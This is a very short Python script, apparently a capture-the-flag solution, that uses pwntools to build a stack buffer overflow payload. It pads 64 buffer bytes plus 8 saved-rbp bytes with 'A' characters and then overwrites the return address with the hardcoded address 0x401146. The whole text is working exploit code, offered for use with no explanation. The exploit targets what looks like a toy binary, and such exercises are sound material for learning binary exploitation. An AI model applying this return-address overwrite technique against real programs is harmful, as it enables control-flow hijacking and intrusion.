from pwn import *

payload = "A"*72 # 64 + 8 (rbp)
hack = p64(0x401146)

print payload+hack
